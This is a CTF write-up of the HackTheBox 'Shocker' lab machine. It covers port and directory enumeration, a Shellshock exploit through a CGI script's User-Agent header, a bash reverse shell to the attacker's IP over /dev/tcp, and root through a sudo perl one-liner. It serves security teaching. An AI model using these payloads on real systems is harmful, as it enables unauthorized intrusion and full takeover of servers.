# Shocker

## Introduction

Welcome to my another writeup! In this HackTheBox [Shocker](https://app.hackthebox.com/machines/Shocker) machine, you'll learn: Exploiting Shellshock vulnerability via Apache's CGI script, Linux privilege escalation via misconfigured `perl` Sudo permission, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★★☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: shelly to root](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Shocker/images/Shocker.png)

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Shocker)-[2023.06.03|18:35:12(HKT)]
└> export RHOSTS=10.10.10.56  
┌[siunam♥earth]-(~/ctf/htb/Machines/Shocker)-[2023.06.03|18:35:17(HKT)]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 2 ports are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|80                | Apache httpd 2.4.18 ((Ubuntu))|
|2222              | OpenSSH 7.2p2 Ubuntu          |

### HTTP on Port 80

**Adding a new host to `/etc/hosts`:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Shocker)-[2023.06.03|18:35:34(HKT)]
└> echo "$RHOSTS shocker.htb" | sudo tee -a /etc/hosts
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Shocker/images/Pasted%20image%2020230603183742.png)

Nothing weird.

**In here, we can use content discovery tools like `gobuster` to find hidden directories and files:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Shocker)-[2023.06.03|18:35:17(HKT)]
└> gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://shocker.htb/ -t 40 
[...]
/server-status        (Status: 403) [Size: 299]
[...]
┌[siunam♥earth]-(~/ctf/htb/Machines/Shocker)-[2023.06.03|18:38:22(HKT)]
└> gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u http://shocker.htb/ -t 40 
[...]
/index.html           (Status: 200) [Size: 137]
/.htaccess            (Status: 403) [Size: 295]
/.                    (Status: 200) [Size: 137]
/.html                (Status: 403) [Size: 291]
/.htpasswd            (Status: 403) [Size: 295]
/.htm                 (Status: 403) [Size: 290]
/.htpasswds           (Status: 403) [Size: 296]
/.htgroup             (Status: 403) [Size: 294]
/.htaccess.bak        (Status: 403) [Size: 299]
/.htuser              (Status: 403) [Size: 293]
/.ht                  (Status: 403) [Size: 289]
/.htc                 (Status: 403) [Size: 290]
/.htaccess.old        (Status: 403) [Size: 299]
/.htacess             (Status: 403) [Size: 294]
[...]
```

Still nothing...

Then, I realized that this machine's name is called `shocker`, which let me think it's about Shellshock vulnerability.

> Shellshock is a Remote Command Execution vulnerability in BASH. The vulnerability relies in the fact that BASH incorrectly executes trailing commands when it imports a function definition stored into an environment variable.
> 
> We could gain Remote Code Execution (RCE) via Apache with `mod_cgi`, CGI Scripts, Python, Perl. (From [https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf](https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf))

That being said, if the web application has CGI script, we can try to exploit Shellshock vulnerability.

From the previous `nmap` service scan (`-sV`), we found that the web server is using Apache.

In Apache, the web server can enable [mod_cgi](https://httpd.apache.org/docs/2.4/mod/mod_cgi.html) to use CGI scripts.

Also all CGI scripts are being stored in the [`/cgi-bin/`](https://httpd.apache.org/docs/2.4/howto/cgi.html) directory:

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Shocker)-[2023.06.03|19:44:31(HKT)]
└> curl http://shocker.htb/cgi-bin/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /cgi-bin/
on this server.<br />
</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at shocker.htb Port 80</address>
</body></html>
```

**So, let's enumerate `cgi` script:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Shocker)-[2023.06.03|19:18:15(HKT)]
└> gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://shocker.htb/cgi-bin/ -t 40 -x cgi,pl,sh
[...]
/user.sh              (Status: 200) [Size: 119]
[...]
```

> Note: CGI script are usually in `cgi`, `pl` (perl), `sh` extension.

**Nice! We found `user.sh` CGI file in `/cgi-bin/`:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Shocker)-[2023.06.03|19:13:49(HKT)]
└> curl http://shocker.htb/cgi-bin/user.sh 
Content-Type: text/plain

Just an uptime test script

 07:19:10 up 46 min,  0 users,  load average: 0.26, 0.25, 0.15
```

And looks like it's executing some OS command and output the result in the response?

## Initial Foothold

Armed with above information, we can test that CGI script is vulnerable to Shellshock or not:

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Shocker)-[2023.06.03|19:20:07(HKT)]
└> curl http://shocker.htb/cgi-bin/user.sh -H "User-Agent: () { :;}; echo; echo shellshocked; /usr/bin/id"
shellshocked
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

It's indeed vulnerable!

Let's get a reverse shell!

- Setup a `nc` listener:

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Shocker)-[2023.06.03|19:25:37(HKT)]
└> rlwrap -cAr nc -lnvp 443
listening on [any] 443 ...
```

- Send the payload: (Generated from [revshells.com](https://www.revshells.com/))

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Shocker)-[2023.06.03|19:25:37(HKT)]
└> curl http://shocker.htb/cgi-bin/user.sh -H "User-Agent: () { :;}; echo; echo shellshocked; /bin/bash -i >& /dev/tcp/10.10.14.26/443 0>&1"
shellshocked

```

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/Shocker)-[2023.06.03|19:25:37(HKT)]
└> rlwrap -cAr nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.10.56] 55756
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ whoami;hostname;id;ip a
whoami;hostname;id;ip a
shelly
Shocker
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b9:d5:87 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.56/24 brd 10.10.10.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:d587/64 scope global mngtmpaddr dynamic 
       valid_lft 86394sec preferred_lft 14394sec
    inet6 fe80::250:56ff:feb9:d587/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `shelly`!

**user.txt:**
```shell
shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt
cat /home/shelly/user.txt
{Redacted}
```

## Privilege Escalation

### shelly to root

As usual, enumerate the system after gaining initial foothold!

**Sudo permission:**
```shell
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

User `shelly` can run `/usr/bin/perl` as root without password!

**According to [GTFObins](https://gtfobins.github.io/gtfobins/perl/#sudo), we can escalate our privilege to root via:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Shocker/images/Pasted%20image%2020230603194843.png)

**Let's do this!**
```shell
shelly@Shocker:/usr/lib/cgi-bin$ sudo /usr/bin/perl -e 'exec "/bin/bash";'
sudo /usr/bin/perl -e 'exec "/bin/bash";'
python3 -c "import pty;pty.spawn('/bin/bash')"
root@Shocker:/usr/lib/cgi-bin# whoami;hostname;id;ip a
whoami;hostname;id;ip a
root
Shocker
uid=0(root) gid=0(root) groups=0(root)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b9:d5:87 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.56/24 brd 10.10.10.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:d587/64 scope global mngtmpaddr dynamic 
       valid_lft 86400sec preferred_lft 14400sec
    inet6 fe80::250:56ff:feb9:d587/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**root.txt:**
```shell
root@Shocker:/usr/lib/cgi-bin# cat /root/root.txt
cat /root/root.txt
{Redacted}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Shocker/images/Pasted%20image%2020230603194943.png)

# Conclusion

What we've learned:

1. Enumerating Hidden Directories & Files Via `gobuster`
2. Exploiting Shellshock Vulnerability Via Apache's `mod_cgi`
3. Vertical Privilege Escalation Via Misconfigured `perl` Sudo Permission